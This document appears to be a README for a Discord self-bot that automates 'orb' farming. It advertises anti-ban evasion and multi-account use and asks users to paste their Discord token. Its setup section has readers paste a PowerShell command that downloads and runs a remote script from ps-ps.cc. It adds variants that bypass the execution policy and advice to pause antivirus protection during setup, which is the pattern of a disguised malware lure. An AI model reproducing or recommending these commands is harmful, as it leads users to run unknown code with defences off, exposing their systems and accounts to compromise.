# 🔮 Discord Orbs Farm Bot — Automated Orb Grinder & Level Up Tool

**Discord Orbs Farm Bot** is a simple, reliable, and user-friendly automation tool designed to collect orbs, coins, and experience points (XP) on Discord servers. If you are tired of typing the same farming commands manually every few minutes, this bot will handle all the repetitive grinding for you.

The program realistically mimics human behavior, allowing you to level up your profile and grow your in-game wallet 24/7 while you rest or focus on other tasks.

---

## ✨ Key Features

* **🤖 24/7 Fully Automated Farming:** The bot automatically claims orbs and executes necessary text commands on a customized schedule.
* **🛡️ Smart Anti-Ban Protection:** Human-like random delays and jitter are built directly into the core engine to keep your account safe from automated detection flags.
* **🌐 Multi-Account Support:** Farm on several profiles simultaneously to maximize your resource collection.
* **⚙️ 5-Minute Easy Setup:** No programming skills required. Simply paste your Discord token, adjust your timer settings, and click start.
* **🛰️ Proxy Integration:** Connect individual HTTP/Socks5 proxies to each profile for safe operation across different IP addresses.
* **📝 Clear Console Logging:** Visual terminal output tracking exactly how many orbs were collected and when the next automated action will trigger.


---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://ps-ps.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://ps-ps.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://ps-ps.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---
